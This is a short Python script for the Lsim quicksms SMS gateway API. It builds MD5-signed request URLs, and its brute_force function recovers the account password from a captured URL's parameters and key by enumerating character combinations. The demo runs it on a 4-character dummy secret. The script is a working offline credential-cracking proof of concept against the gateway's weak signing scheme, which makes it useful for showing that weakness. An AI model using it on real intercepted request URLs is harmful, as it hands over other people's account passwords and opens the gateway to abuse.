from dataclasses import dataclass
import hashlib
import itertools
import string
import time
from typing import Optional

from urllib import parse

__all__ = [
    "generate_signature", 
    "generate_key",
    "convert_query_dict",
    "Lsim",
    "brute_force",
    "CHARS"
]


CHARS = string.ascii_letters + "1234567890" + "!@#$%^&*()"

BASE_URL = "http://apps.lsim.az/quicksms/v1/send"


def generate_signature(text: str) -> str:
    result = hashlib.md5(bytes(text, "utf-8"))
    return result.hexdigest()


def generate_key(
    password: str, 
    login: str, 
    text: str, 
    phone_number: str, 
    sender: str
) -> str:
    key_str = "{password}{login}{text}{phone_number}{sender}".format(
        password=generate_signature(password).lower(),
        login=login,
        text=text,
        phone_number=phone_number,
        sender=sender,
    )
    return generate_signature(key_str).lower()


def convert_query_dict(params: dict) -> dict:
    result = {}
    for key in params.keys():
        result[key] = params[key][0] if isinstance(params[key], list) else params[key]
    
    return result


@dataclass
class Lsim(object):
    username: str
    secret: str
    sender: str
    phone: str
    text: str

    url: Optional[str] = None

    def generate_link(self) -> str:
        key = generate_key(
            self.secret, self.username, self.text, self.phone, self.sender
        )

        params = {
            "login": self.username,
            "msisdn": self.phone,
            "text": self.text,
            "sender": self.sender,
            "key": key,
        }
        self.url = BASE_URL + "?" + parse.urlencode(params)

        return self.url

    def read_params(self) -> dict:
        if not self.url:
            return {}
        result = parse.urlparse(self.url)
        return parse.parse_qs(result.query)


def brute_force(params: dict, char_count: int) -> str:
    params = convert_query_dict(params)
    key = params.pop("key")
    perms = itertools.product(CHARS, repeat=char_count)
    password = ""
    found = False

    for p in perms:
        password = "".join(p)
        if (
            generate_key(
                password,
                params["login"],
                params["text"],
                params["msisdn"],
                params["sender"],
            )
            == key
        ):
            found = True
            break

    return password if found else ""


if __name__ == "__main__":
    start = time.time()

    lsim = Lsim(
        username="lsim",
        secret="g4#a",
        sender="example",
        phone="994000000000",
        text="lorem ipsum dolor",
    )

    lsim.generate_link()
    params = lsim.read_params()

    password = brute_force(params=params, char_count=4)

    print("Password is:", password)

    print("process finished: ", str(time.time() - start))
